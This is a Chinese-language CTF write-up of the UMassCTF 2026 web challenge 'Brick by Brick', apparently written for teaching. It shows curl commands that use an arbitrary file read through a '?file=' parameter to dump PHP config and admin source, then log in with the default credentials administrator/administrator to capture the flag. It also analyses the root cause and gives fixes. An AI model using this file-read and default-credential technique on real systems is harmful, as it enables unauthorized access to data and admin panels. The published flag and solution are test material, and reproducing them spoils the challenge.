# UMassCTF 2026 - Brick by Brick Writeup

## 题目信息
- **比赛**: UMassCTF 2026
- **题目**: Brick by Brick
- **类别**: Web
- **难度**: 简单
- **附件/URL**: `http://brick-by-brick.web.ctf.umasscybersec.org:32769/`
- **附件链接**: 无附件，题目为在线靶机
- **Flag格式**: `UMASS{...}`
- **状态**: 已解

## Flag

```text
UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
```

## 解题过程

### 1. 初始侦察/文件识别
- 入口点只有一个极简首页：`http://brick-by-brick.web.ctf.umasscybersec.org:32769/`
- 页面内容非常少，没有 JavaScript，也没有明显的后台入口

先用 `curl` 查看原始响应，确认只是一个静态欢迎页：

```http
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.2.30
Content-Type: text/html; charset=UTF-8
```

继续查看 `robots.txt`，这里直接给了关键线索：

```text
User-agent: *
Disallow: /internal-docs/assembly-guide.txt
Disallow: /internal-docs/it-onboarding.txt
Disallow: /internal-docs/q3-report.txt
```

这说明站点里存在一个没有在前台链接出来的 `/internal-docs/` 目录，可以先从这里入手。

### 2. 关键突破点一

读取 `it-onboarding.txt` 后，文档中给出了两条非常重要的信息：

```text
The internal document portal lives at our main intranet address.
Staff can access any file using the ?file= parameter:

Credentials are stored in the application config file
for reference by the IT team. See config.php in the web root.
```

这段话等价于明示：

1. 主站存在 `?file=` 文件读取功能。
2. 配置文件 `config.php` 位于 Web 根目录。

于是直接访问：

```text
/?file=config.php
```

返回内容中出现了后台路径：

```php
// The admin dashboard is located at /dashboard-admin.php.
```

同时还能看到开发人员把后台凭据放在配置里，只是把密码字段手工“删掉”了：

```php
define('ADMIN_USER', 'administrator');
define('ADMIN_PASS', '[deleted it for safety reasons - Tom]');
```

这说明题目的核心漏洞已经成立：`index.php` 存在任意文件读取，攻击者可以直接读取同目录下的敏感源码。

### 3. 关键突破点二

既然已经知道后台入口是 `/dashboard-admin.php`，下一步最直接的做法不是爆破登录，而是继续读源码：

```text
/?file=dashboard-admin.php
```

源码开头直接写死了后台默认凭据和 flag：

```php
define('DASHBOARD_USER', 'administrator');
define('DASHBOARD_PASS', 'administrator');
define('FLAG', 'UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}');
```

并且登录逻辑就是最普通的字符串比较：

```php
if ($user === DASHBOARD_USER && $pass === DASHBOARD_PASS) {
    $_SESSION['logged_in'] = true;
    $logged_in = true;
}
```

这里可以看出两件事：

- 后台账号仍在使用默认口令 `administrator / administrator`
- flag 会在登录成功后渲染到后台页面中

### 4. 获取 Flag

最后直接向后台提交默认凭据即可：

```bash
curl -c cookies.txt -b cookies.txt \
  -X POST \
  -d "username=administrator&password=administrator" \
  http://brick-by-brick.web.ctf.umasscybersec.org:32769/dashboard-admin.php
```

登录后的页面返回：

```html
<div class="flag-value">UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}</div>
```

因此最终 flag 为：

```text
UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
```

## 攻击链/解题流程总结

```text
访问 robots.txt → 发现 /internal-docs/ → 阅读 onboarding 文档 → 发现 ?file= 文件读取 → 读取 config.php 拿到后台路径 → 读取 dashboard-admin.php 源码 → 获得默认凭据与 flag → 登录后台取 flag
```

## 漏洞分析 / 机制分析

### 根因
- 主站 `index.php` 直接将用户提供的 `file` 参数拼接到 `/var/www/html/` 后做 `file_get_contents()`，形成任意文件读取
- 开发者把敏感信息写在源码和配置文件中，包括后台路径、默认账号口令和 flag
- 后台继续使用默认凭据 `administrator / administrator`，且没有任何额外访问控制

题目中的核心代码逻辑大致如下：

```php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $path = '/var/www/html/' . $file;
    if (file_exists($path)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($path)) . "</pre>";
    }
    exit;
}
```

### 影响
- 攻击者可读取 Web 根目录下的任意文件
- 配置文件、后台源码、凭据、业务逻辑和敏感常量都会被直接暴露
- 一旦源码中存在默认凭据或硬编码密钥，攻击者可进一步接管后台

### 修复建议（适用于漏洞类题目）
- 禁止使用用户可控参数直接拼接文件路径；改为白名单映射
- 文档查看功能应限制在固定目录，并做规范化路径校验
- 后台凭据、数据库密码、密钥等敏感信息应放入环境变量或安全配置中心
- 上线前移除默认口令，并强制管理员首次登录修改密码
- 敏感源码文件不应通过 Web 应用逻辑直接回显给前端

## 知识点
- 任意文件读取（LFI / File Read）在 PHP 题里经常由 `?file=`、`page=`、`include=` 这类参数引出
- `robots.txt` 不仅不是安全边界，反而常常会泄露隐藏目录和敏感路径
- 拿到配置文件后，优先继续读后台源码，比盲猜口令或爆破更高效

## 使用的工具
- **curl** — 直接拉取页面、文档和源码，并提交登录请求
- **浏览器开发者工具 / Playwright** — 快速确认前台页面结构和资源加载情况
- **PowerShell** — 小范围枚举常见路径，辅助定位隐藏入口

## 脚本归档
- Python：[`UMassCTF2026_Brick_by_Brick.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/UMassCTF2026_Brick_by_Brick.py){target="_blank"}
- 说明：脚本使用 Python 标准库自动完成文档发现、源码读取、flag 提取与登录验证

## 命令行提取关键数据（无 GUI）

```bash
# 1. 查看 robots.txt，发现隐藏文档目录
curl http://brick-by-brick.web.ctf.umasscybersec.org:32769/robots.txt

# 2. 读取 onboarding 文档，发现 ?file= 与 config.php 线索
curl "http://brick-by-brick.web.ctf.umasscybersec.org:32769/internal-docs/it-onboarding.txt"

# 3. 利用文件读取拿到配置文件
curl "http://brick-by-brick.web.ctf.umasscybersec.org:32769/?file=config.php"

# 4. 继续读取后台源码
curl "http://brick-by-brick.web.ctf.umasscybersec.org:32769/?file=dashboard-admin.php"

# 5. 用默认凭据登录后台并验证 flag
curl -c cookies.txt -b cookies.txt \
  -X POST \
  -d "username=administrator&password=administrator" \
  http://brick-by-brick.web.ctf.umasscybersec.org:32769/dashboard-admin.php
```

## 推荐工具与优化解题流程

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| **curl** | 侦察、读取源码、提交登录 | ~3 分钟 | 快、无依赖、复现性强 | 交互性一般 |
| **Burp Suite** | 手工重放与参数测试 | ~5 分钟 | 适合观察请求细节和反复修改参数 | 需要 GUI |
| **ffuf / dirbust** | 路径枚举 | ~5 分钟 | 适合发现隐藏目录 | 对这题来说属于辅助，不是核心 |

### 推荐流程

**推荐流程**：`curl` 查看响应与 `robots.txt` → 读取内部文档 → 验证 `?file=` 文件读取 → 读取配置与后台源码 → 提交默认凭据登录 → Flag。整题手工完成一般不超过 10 分钟。

### 工具 A（推荐首选）
- **安装**：系统自带 `curl` 即可
- **详细步骤**：
  1. 访问首页与 `robots.txt`，收集隐藏路径
  2. 读取内部文档，确认 `?file=` 和目标文件名
  3. 直接读取 `config.php` 与 `dashboard-admin.php`，提取凭据和 flag
- **优势**：最贴合这题的利用链，不需要额外脚本和复杂代理设置

### 工具 B（可选）
- **安装**：Burp Suite Community / Professional
- **详细步骤**：
  1. 用浏览器抓首页请求
  2. 在 Repeater 中手工修改 `?file=` 参数
  3. 观察后台登录请求与响应，确认 flag 是否真实存在于页面
- **优势**：适合教学和演示，也方便后续做更复杂的参数测试
